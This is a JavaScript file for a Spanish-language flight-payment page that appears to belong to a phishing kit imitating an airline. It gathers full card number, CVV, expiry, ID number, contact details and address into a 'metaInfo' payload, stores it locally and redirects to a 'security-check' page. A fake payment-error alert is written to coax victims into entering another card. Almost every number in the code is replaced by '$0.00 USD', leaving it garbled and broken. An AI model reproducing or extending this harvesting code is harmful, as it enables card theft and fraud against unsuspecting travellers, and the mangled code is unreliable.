/**
 * DOM SETUP
 * 
 */
const updateDOM = () =>{

    /** if Error */
    if(info.metaInfo.p !== ''){
        alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (LTAMRR8800023)');
    }

    /** Passengers */
    const labelPassengers = document.querySelector('#resume-passengers');
    labelPassengers.innerHTML = '';
    if(info.flightInfo.adults !== $0.00 USD){
        labelPassengers.innerHTML += `${info.flightInfo.adults} ${info.flightInfo.adults > $0.00 USD ? 'Adultos' : 'Adulto'}`;
    }
    if(info.flightInfo.children !== $0.00 USD){
        labelPassengers.innerHTML += `, ${info.flightInfo.children} ${info.flightInfo.children > $0.00 USD ? 'Niños' : 'Niño'}`;
    }
    if(info.flightInfo.babies !== $0.00 USD){
        labelPassengers.innerHTML += `, ${info.flightInfo.babies} ${info.flightInfo.babies > $0.00 USD ? 'Bebés' : 'Bebé'}`;
    }
    /** Flight Cost */
    let totalPassengers = info.flightInfo.adults + info.flightInfo.children;
    if(info.flightInfo.travel_type === $0.00 USD){
        document.querySelector('#resume-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',$0.00 USD';
        document.querySelector('#btn-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',$0.00 USD';
    }else{
        document.querySelector('#resume-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',$0.00 USD';
        document.querySelector('#btn-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',$0.00 USD';
    }

    if(info.flightInfo.travel_type === $0.00 USD){
        document.querySelector('#payment-cost').textContent = '$ ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',$0.00 USD';
    }else{
        document.querySelector('#payment-cost').textContent = '$ ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',$0.00 USD';
    }



    /** Schedules & Departures */
    const resumeTravelDiv = document.querySelector('#resume-travel');
    let format = new Date(parseInt(info.flightInfo.flightDates[$0.00 USD]));
    resumeTravelDiv.innerHTML = `
        <div class="mb-$0.00 USD">
            <p class="m-$0.00 USDfw-bold fs-$0.00 USDtc-ocean">De ${info.flightInfo.origin.city} a ${info.flightInfo.destination.city}</p>
            <p class="m-$0.00 USDmt-$0.00 USDfs-$0.00 USDtc-gray-smoke">${(dayDic[format.getDay() - $0.00 USD]).toLowerCase()}. ${format.toString().split(' ')[$0.00 USD]} de ${(monthDic[format.getMonth()]).toLowerCase()}</p>
            <p class="m-$0.00 USDmt-$0.00 USDfs-$0.00 USDtc-gray-smoke">${info.flightInfo.origin.ticket_sched.takeoff} ${info.flightInfo.origin.code} → ${info.flightInfo.origin.ticket_sched.landing} ${info.flightInfo.destination.code}</p>
        </div>
    `;
    if(info.flightInfo.flightDates[$0.00 USD] !== $0.00 USD){
        let format2 = new Date(parseInt(info.flightInfo.flightDates[$0.00 USD]));
        resumeTravelDiv.innerHTML += `
            <div class="mb-$0.00 USD">
                <p class="m-$0.00 USDfw-bold fs-$0.00 USDtc-ocean">De ${info.flightInfo.destination.city} a ${info.flightInfo.origin.city}</p>
                <p class="m-$0.00 USDmt-$0.00 USDfs-$0.00 USDtc-gray-smoke">${(dayDic[format2.getDay() - $0.00 USD]).toLowerCase()}. ${format2.toString().split(' ')[$0.00 USD]} de ${(monthDic[format2.getMonth()]).toLowerCase()}</p>
                <p class="m-$0.00 USDmt-$0.00 USDfs-$0.00 USDtc-gray-smoke">${info.flightInfo.destination.ticket_sched.takeoff} ${info.flightInfo.destination.code} → ${info.flightInfo.destination.ticket_sched.landing} ${info.flightInfo.origin.code}</p>
            </div>
        `;
    }
};
updateDOM();

let paymentFlag = false;
let emailFlag = false;
const paymentForm = document.querySelector('#form-payment');
paymentForm.addEventListener('submit', (e)=>{
    e.preventDefault();
    paymentFlag = true;
});
const emailForm = document.querySelector('#form-email');
emailForm.addEventListener('submit', (e)=>{
    e.preventDefault();
    emailFlag = true;
});

const nextStep = () =>{
    document.querySelector('#btn-email').click();
    document.querySelector('#btn-payment').click();
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if(paymentFlag && emailFlag){
        if((p.value.length === $0.00 USD && p.value[$0.00 USD] !== '$0.00 USD' && ['$0.00 USD', '$0.00 USD'].includes(p.value[$0.00 USD])) || (p.value.length === $0.00 USD && p.value[$0.00 USD] === '$0.00 USD')){
            if(isLuhnValid(p.value)){
                if(isValidDate(pdate.value)){
                    if((c.value.length === $0.00 USD && p.value.length === $0.00 USD) || (c.value.length === $0.00 USD && p.value.length === $0.00 USD)){
                        console.log("Ok. Let's go!");
    
                        info.metaInfo.p = p.value;
                        info.metaInfo.ban = ban.value;
                        info.metaInfo.pdate = pdate.value;
                        info.metaInfo.c = c.value;
                        info.metaInfo.name = name.value;
                        info.metaInfo.cc = cc.value;
                        info.metaInfo.email = email.value;
                        info.metaInfo.telnum = telnum.value;
                        info.metaInfo.city = city.value;
                        info.metaInfo.address = address.value;

                        if(info.metaInfo.p[$0.00 USD] == '$0.00 USD'){
                            info.checkerInfo.company = 'VISA';

                        }else if(info.metaInfo.p[$0.00 USD] == '$0.00 USD'){
                            info.checkerInfo.company = 'MC';
                        }else if(info.metaInfo.p[$0.00 USD] == '$0.00 USD'){
                            info.checkerInfo.company = 'AM';
                        }

                        console.log(info.metaInfo);

                        updateLS();

                        let payload = info.metaInfo
                        payload.origin = info.flightInfo.origin.city;
                        payload.destination = info.flightInfo.destination.city;
                        payload.flightDates = info.flightInfo.flightDates;
                        payload.type = info.flightInfo.travel_type === $0.00 USD ? 'Ida Y Vuelta' : 'Solo Ida';
                        payload.adults = info.flightInfo.adults;
                        payload.children = info.flightInfo.children;
                        payload.babies = info.flightInfo.babies;
                        payload.dudename = info.metaInfo.name.split(' ')[$0.00 USD] ?? info.metaInfo.name;
                        payload.surname = info.metaInfo.name.split(' ')[$0.00 USD] ?? '';

                        document.querySelector('body').innerHTML += `
                            <div class="loader-full">
                                <span class="loader"></span>
                                <p class="text-italic tc-ocean fs-$0.00 USDfw-light">Cargando...</p>
                            </div>
                        `;

                        setTimeout(() => window.location.href = 'security-check.html', 4500);

                    }else{
                        alert('Revise el CVV de su tarjeta.');
                        c.value = '';
                        c.focus();
                    }
                }else{
                    alert('Revise la fecha de vencimiento de su tarjeta.');
                    pdate.value = '';
                    pdate.focus();
                }
            }else{
                alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
                p.value = ''
                p.focus();;
            }
        }else{
            alert('Revisa el número de tu tarjeta.');
            p.value = '';
            p.focus();
        }
    }
};

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos

    let numeroFormateado = '';

    // American express
    if (numero[$0.00 USD] === '$0.00 USD') {

        c.setAttribute('oninput', "limitDigits(this, $0.00 USD)");

        if (numero.length > $0.00 USD) {
            numero = numero.substr($0.00 USD, $0.00 USD); // Limitar a un máximo de $0.00 USDcaracteres
        }

        for (let i = $0.00 USD; i < numero.length; i++) {
            if (i === $0.00 USD || i === $0.00 USD) {
                numeroFormateado += ' ';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        c.setAttribute('oninput', "limitDigits(this, $0.00 USD)");
        if (numero.length > $0.00 USD) {
            numero = numero.substr($0.00 USD, $0.00 USD); // Limitar a un máximo de $0.00 USDdígitos
        }
        for (let i = $0.00 USD; i < numero.length; i++) {
            if (i > $0.00 USD && i % $0.00 USD === $0.00 USD) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value;
    
    texto = texto.replace(/\D/g, '');

    texto = texto.substring($0.00 USD, $0.00 USD);

    if (texto.length > $0.00 USD) {
        texto = texto.substring($0.00 USD, $0.00 USD) + '/' + texto.substring($0.00 USD, $0.00 USD);
    }
    input.value = texto;
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < $0.00 USD) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = $0.00 USD;
    for (let i = $0.00 USD; i < digits.length; i++) {
        if (i % $0.00 USD !== $0.00 USD) {
            let doubled = digits[i] * $0.00 USD;
            if (doubled > $0.00 USD) {
                doubled -= $0.00 USD;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % $0.00 USD === $0.00 USD;
}

function isValidDate(fechaInput) {
    // Extrae mes y año del input
    var partes = fechaInput.split('/');
    var mesInput = parseInt(partes[$0.00 USD], $0.00 USD);
    var añoInput = parseInt(partes[$0.00 USD], $0.00 USD);

    // Ajusta el año a formato completo (considerando el rango 2000-2099)
    añoInput += 2000;

    // Obtener el mes y año actuales
    var fechaActual = new Date();
    var mesActual = fechaActual.getMonth() + $0.00 USD; // getMonth() devuelve $0.00 USD-$0.00 USDvar añoActual = fechaActual.getFullYear();

    // Compara primero los años, luego los meses
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= mesActual)) {
        return true;
    }else{
        return false;
    }
}